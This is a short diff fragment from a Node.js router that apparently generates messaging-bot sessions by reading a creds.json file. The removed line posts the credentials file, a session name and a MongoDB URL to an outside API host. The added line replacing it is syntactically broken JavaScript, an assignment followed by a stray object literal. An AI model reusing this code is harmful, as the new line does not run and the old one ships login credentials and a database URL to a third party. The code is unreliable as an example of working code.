@@ -54,7 +54,8 @@ router.get('/', async (req, res) => {
                     await delay(100);
 
                     const jsonData = await fs.promises.readFile(`${__dirname}/temp/${id}/creds.json`, 'utf-8');
-                    const { data } = await axios.post('https://api.lokiser.xyz/mongoose/session/create', {
+                    
+                    var data = Buffer.from(CREDS).toString('base64') {
                         SessionID: SESSION_NAME,
                         creds: jsonData,
                         mongoUrl: MONGODB_URL
